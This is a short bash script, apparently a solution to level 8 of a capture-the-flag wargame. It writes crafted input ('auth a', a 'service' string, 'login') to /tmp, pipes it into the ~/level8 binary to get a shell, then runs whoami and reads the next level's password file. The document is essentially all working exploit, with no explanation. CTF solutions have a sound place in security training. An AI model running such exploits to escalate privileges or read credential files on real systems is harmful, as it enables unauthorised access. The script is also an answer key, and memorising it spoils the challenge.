#!/bin/bash

GETPASS="cat /home/user/level9/.pass"

set -x

cat << EOI > /tmp/exploit8
auth a
service0123456789abcdef
login
EOI

(cat /tmp/exploit8 - | ~/level8) << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$($GETPASS)\n"
EOI